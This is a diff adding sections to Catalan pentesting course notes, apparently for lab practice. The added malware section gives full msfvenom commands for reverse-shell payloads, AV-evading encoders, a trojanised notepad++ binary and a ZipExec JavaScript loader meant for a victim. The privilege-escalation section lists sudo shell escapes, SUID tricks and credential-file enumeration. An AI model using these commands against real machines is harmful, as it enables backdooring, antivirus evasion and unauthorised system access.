@@ -103,27 +103,100 @@
 
 <section id="creacio">
 <h1>Creació de malware</h1>
+ <p>Per obtindre accés a una màquina i mantindre la persistència en ella s'empren diverses tècniques. Una de les més habituals és la instal·lació 
+  de <strong>backdoors</strong> o portes darreres. Per a este fi, es crea un <strong>malware ad-hoc</strong>, per intentar evadir els antivirus en la màquina víctima.  </p>
+<p>La creació de malware és una tasca difícil. Es pot aprofundir en el tema en el repositori Awesome Malware Developement, en GitHub de rootkit-io </p>
 <h2>msfvenom</h2>
-<p>Forma part del framework de metasploit, pero funciona de manera independent</p>
+<p>Forma part del framework de metasploit, però funciona de manera independent. S'empra per generar <strong>payloads</strong>, xifrar-los, codificar/ofuscar, i 
+  acoblar el payload a un binari legítim. </p>
+<p>Per generar un <strong>malware</strong> hi ha diferents elements a tindre en compte: payloads, Encoders, nops, platforms, archs, encrypt i formats. Es pot 
+  consultar una llista de cada mòdul amb l'opció -l  o  --list     </p>
+<pre>$ msfvenom -l [payloads | Encoders | nops | platforms | archs | encrypt | formats]</pre>  
+
+<pre>Primer exemple
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=192.168.56.8 lport=4444 -f exe > payload_sin_encriptar.exe  
+</pre>
+
+<p>El payload escollit pot tindre una gran quantitat d'opcions, i per consultar-les s'usa l'opció  --list-options</p>
+<pre>msfvenom -p windows/meterpreter/reverse_tcp --list-options</pre>
+
+<p>El següent pas és fer arribar el binari a la víctima, obrir un <strong>listener</strong> en l'equip atacant, i esperar que l'usuari caiga en la trampa..</p>
+<p>Es pot posar el listener en <strong>metasploit</strong> amb el mòdul <strong>exploit/multi/handler</strong> i el mateix payload que s'ha carregat en el binari.</p>
+<pre>msf> 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp 
+set lhost 192.168.56.8
+set lport 4444
+run</pre>
+<p>Quan l'usuari execute el binari, el metasploit obri un meterpreter...</p>
+<p>És possible que el <strong>defender</strong> de windows detecte i bloquege el binari, per tant, per fer proves, s'haurà de desactivar el defender en la màquina windows.</p>
+<p>Es poden usar diferents <strong>encoders</strong> en el nostre payload per tractar d'evitar les posibles proteccions en les màquines víctimes. Els <strong>encoders</strong>
+s'indicaran amb l'opció <strong>-e</strong> en msfvenom</p>
+<pre>-e x86/shikata_ga_nai -i 5</pre>
+<p>En lloc de generar el nostre propi binari, es pot fer servir <strong>msfvenom</strong> per incrustar el nostre payload en un programa legítim. Amb l'opció -x o --template,
+s'indicarà la ruta a l'executable que es desitja usar com plantilla. Amb l'opció -k o --keep, es manté el comportament del binari legítim i el payload es llançarà 
+com un nou fil d'execució.</p>
+<pre># Exemple
+# Primer s'ha de baixar l'executable des de la pàgina oficial....
+# Després es backdooritza !!
+msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.56.8 lport=4444 -x notepad++.exe -k -f exe -a x86 --platform windows -e x86/shikata_ga_nai -i 5 -o evil-putty.exe
+# També es pot ometre "-a x86 --platform windows " i que msfvenom busque 
+msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.56.8 lport=4444 -x notepad++.exe -k -f exe -e x86/shikata_ga_nai -i 5 -o evil-putty.exe
+</pre>
+<p>En este cas hem usat un payload de tipus single, cosa que permetrà manejar la connexió mitjançant un listener de <strong>netcat</strong></p>
+<pre><code>nc -lnvp 4444</code></pre>
+
+
 <h2>ZipExec</h2>
-<p>Desenvolupat com a PoC de que es possible executar binaris emmagatzemats en fitxers ZIP comprimits amb contrasenya,
+<p>Desenvolupat com a PoC de que és possible executar binaris emmagatzemats en fitxers ZIP comprimits amb contrasenya,
     evitant així els antivirus, que no poden comprovar el contingut del fitxer</p>
+<p>Per usar la ferramenta: Primer la compilem.</p>
+<pre>git clone https://github.com/Tylous/ZipExec.git 
+cd ZipExec
+go get github.com/yeka/zip 
+go build ZipExec.go 
+./ZipExec -h 
+
+Ja tenim la ferramenta en el notre sistema. </pre>
+<p>Ara a usar-la. El fitxer maliciós generat és un fitxer JavaScript que conté el binari comprimit i les comandes per regenerar este fitxer en disc i executar-lo</p>
+<pre>./ZipExec -I payload_sin_encriptar.exe -O shell-loader.js</pre>
+<p>Enviem el fitxer .js a la víctima i obrim un multi/handler en msf esperant que l'usuari pique..</p>
+<pre><code>msf> exploit(multi/handler) > run</code></pre>
  
   </section>         
 
     <section id="escalada">
     <h1>Escalada privilegis en Linux</h1>
+    <p>Existeixen molts mecanismes per a escalar privilegis en sistemes Linux. Alguns d'estos, els més bàsics, es voran en este apartat, com per exemple,
+      l'escalada de privilegis a través de vulnerabilitats en el kernel de linux, a través de tasques programades, usant binaris amb privilegis de <strong>sudo</strong>
+       o binaris SUID.  </p>
+      <p>Però abans d'emprar algun d'estos mecanismes, és necessari conéixer els diferents comandos i scripts per fer una <strong>enumeració local</strong> i trobar
+        el millor camí fins a una <strong>shell privilegiada</strong>.</p>
+      <p>Per practicar estos conceptes i altres més avançats, poden usar-se alguns dels laboratoris gratuits d'escalada de privilegis en Linux disponibles
+        en <strong>TryHackMe</strong>, i entre estos, un elaborat per TCM (The Cyber Mentor), que inclou vídeos explicatius en youtube.  (The Cyber Mentor. Linux 
+        privilege Escalation for Beginners) . Laboratoris en https://TryHackMe.com/room/linuxprivesc linprivesc linuxprivescarena  </p>
+
     <h2>Enumeració local en Linux</h2>
+    <p>L'enumeració local consistix en obtenir la quantitat més gran d'informació del sistema per tractar de trobar elements vulnerables, que permeten escalar
+      privilegis a un compte amb permisos d'administració.      </p>
       <h3>Enumeració Manual</h3>
       <pre>hostname
 uname -a 
 ifconfig   o  ip a 
+
 netstat -tpln
 /etc/hosts   i  sites-available 
 /proc 
 ps -ef --forest
 crontab -l    i   /etc/crontab 
+
+/var/www   --on es situa les app Web
+wp-config.php 
+/etc/passwd    -- per saber usuaris i Grups
+/home          -- altres usuaris
+
 id    history   env    sudo -l   
+
 find / -type f -perm 0777 2>/dev/null
 find / -type f -name ".*"
 find / -type f -readable     find / -type d -readable
@@ -133,32 +206,47 @@ find / -type f -perm -u=s
 find / -type f -perm  -g=s     </pre>
 
 
-      <h3>Enumeració automàtica</h3>
-      <p>LinPEAS  (WinPEAS )</p>
-      <p>Linux Smart Enumeration</p>
-      <p>Linux Exploit Suggester</p>
+    <h3>Enumeració automàtica</h3>
+    <p>Existeixen multitud de ferramentes que realitzen l'execucio dels comandes anteriors ( i molts altres) de manera automàtica, i ens presenten
+      una gran quantitat d'informació.      </p>
+    
+    <h4>LinPEAS  (WinPEAS )</h4>
+    <p>Un script en bash que es manté actualitzat casi setmanalment. És la ferramenta més usada actualment. Té una versió per a Windows (WinPEAS), i 
+      formen part d'una suite anomenada PEASS-ng (Privilege Escalation Awesome Scripts Suite new generation)      </p>
+    <h4>Linux Smart Enumeration - LinEnum</h4>
+    <p>Una altra ferramenta en bash basada en l'anterior, que actualment no es troba mantenida.</p>
+    <h4>Linux Exploit Suggester</h4>
+    <p>Ferramenta específica per buscar exploits per la versió del kernel que s'està executant en el SO.</p>
+    <h4>pspy</h4>
+    <p>unprivileged Linux process snooping. Permet vore en els processos del sistema sense tindre privilegis de <strong>root</strong>.</p>
 
 
     <h2>Escalada amb el kernel</h2>
     <ul>Algunes vulnerabilitats històriques del kernel de Linux
-      <li>Dirty COW</li>
-      <li>Dirty Pipe</li>
-      <li>Sudo Baron Samedit</li>
-      <li>OverlayFS</li>
-      <li>PwnKit</li>
-      <li>CVE-2022-47939 sobre ksmbd</li>
+      <li>Dirty COW (CVE-2016-5195)</li>
+      <li>Dirty Pipe (CVE-2022-0847)</li>
+      <li>Sudo Baron Samedit (CVE-2021-3156)</li>
+      <li>OverlayFS (CVE-2021-3493)</li>
+      <li>PwnKit (CVE-2021-4034)</li>
+      <li>CVE-2022-47939 sobre servei ksmbd (servidor samba)</li>
       <li>i més....</li>
     </ul>
+    <p>No s'ha de perdre de vista este tipus de vulnerabilitats de kernel, perquè molts sistemes no estan actualitzats i poden tindre forats de seguretat oberts</p>
 
     <h2>Escalada amb sudo</h2>
     <h3>Que és sudo</h3>
-    <p>sudo (superuser do) és una eina que permet a usuaris normals executar comandes amb privilegis elevats (normalment com a root),
+    <p><strong>sudo</strong> (superuser do) és una eina que permet a usuaris normals executar comandes amb privilegis elevats (normalment com a root),
        de manera controlada i auditada.</p>
     <p>És el mètode recomanat per a administració segura a Linux.</p>
     <p>El fitxer <strong>sudoers</strong> defineix: Qui pot usar sudo, Quines comandes , Com (amb o sense contrasenya), Com a quin usuari</p>
     <p>📍 Ubicació habitual: <code> /etc/sudoers </code></p>
     <p>⚠️ No s’ha d’editar mai directament amb editors normals.</p>
     <p> <code>visudo</code> és l’eina segura per editar el fitxer sudoers.</p>
+    <p>Es pot ampliar informació en l'article "Linux Fundamentals: A to Z of a Sudoers File" en https://medium.com/kernel-space/linux-fundamentals-a-to-z-of-a-sudoers-file-a5da99a30e7f</p>
+
+    <pre>-- Per afegir un usuari al grupo de sudoers (sudo)
+    sudo usermod -aG sudo 'nomusuari'</pre>
+    
     <h3>Exemple de linea de sudoers</h3>
     <code>usuari_o_grup  hosts = (usuari_execució:grup_execució) opcions  comandes </code> <br>
     <pre>alice ALL=(ALL) ALL </pre>
@@ -174,12 +262,24 @@ find / -type f -perm  -g=s     </pre>
      <p>i a continuació , si hi ha algun comando permés, buscar la forma de explotar-lo, en GTFOBINS, per a linux</p>
      <p>Per executar un comando amb un altre usuari</p>
      <pre>sudo -u nomusu nomcomando</pre>
+      <p class="alert">La web <strong>GTFOBins</strong> conté un llistat dels binaris presents en sistemes operatius *nix que poden ser usats per a escalar
+      privilegis en cas que s'hagen configurat erròniament.</p>
+      <pre>Per exemple:  vi 
+      sudo vi -c ':!/bin/sh' /dev/null
+      sudo vim -c ':!/bin/sh'
+      </pre>
+
     
     <h2>Escalada amb SUID/SGID</h2>
     <p>El bit SUID <strong>Set-User-ID</strong> és un mecanisme de permisos de Linux/Unix que permet 
       que un programa s’execute amb els privilegis del propietari del fitxer, i no amb els de l’usuari que l’executa. </p>
       <h4>Com identificar-lo</h4>
        <pre>-rw<span style="color: darkgreen; font-weight: bold;">s</span>r-xr-x </pre>
+<pre>ls -la /usr/bin/passwd
+-rwsr-xr-x 1 root root 64152 may 30  2024 /usr/bin/passwd   </pre>
+<pre>Com assignar el bit SUID
+chmod u+s /path_to_binary </pre>
+
       <h4>Com trobar fitxers amb este bit</h4>
       <pre>find / -perm -u=s -type f 2>/dev/null
 find / -perm -4000 2>/dev/null        
@@ -196,6 +296,10 @@ find / -perm -4000 -exec ls -l {} \; 2>/dev/null     </pre>
       <p>Quan un directori té SGID: Tots els fitxers creats dins hereten el grup del directori  </p>
      <h4>Com identificar-lo</h4>
      <pre>-rwxr-<span style="color: darkgreen; font-weight: bold;">s</span>r-x  </pre> 
+    <pre>Com assignar el bit SGID
+    chmod g+s /path_to_binary 
+    chmod g+s /path_to_directory </pre>
+
       <h4>Com trobar fitxers amb este bit</h4>
             <pre>find / -perm -g=s -type f 2>/dev/null
 find / -perm -2000 2>/dev/null
@@ -213,7 +317,8 @@ find / -perm -2000 -exec ls -l {} \; 2>/dev/null     </pre>
      <p>🧮 Valor numèric del Sticky Bit: 1000</p>
      <h3>Escalada</h3>
      <p>Conieixent este mecanisme es podrà fer una escalada de privilegis local a través d'estos binaris, de forma
-      similar a la explicada en sudo. La web GTFOBins també te informació sobre com utilitzar els binaris mal configurats.      </p>
+      similar a la explicada en sudo.       </p>
+      <p class="alert">La web GTFOBins també té informació sobre com utilitzar els binaris mal configurats. </p>
 
     <h2>Escalada amb tasques programades</h2>
     <p>Les tasques programades amb cron permeten executar comandes o scripts automàticament a Linux/Unix segons un 
@@ -387,7 +492,7 @@ ssh -R 9000:127.0.0.1:8080 user@pivot.company.local  </pre>
         <li>127.0.0.1:8080  :  Destí local (127.0.0.1 → la teva màquina )  (8080 → el servei que ja està escoltant localment)</li>
         <li>user@pivot.company.local :   Servidor remot on es crea el port</li>
       </ul>
-      <p>👉 Qualsevol que accedeixi a pivot.company.local:9000 , estarà accedint indirectament al teu servei local.</p>
+      <p>👉 Qualsevol que accedisca a pivot.company.local:9000 , estarà accedint indirectament al teu servei local.</p>
 
 
       <h2>amb chisel</h2>
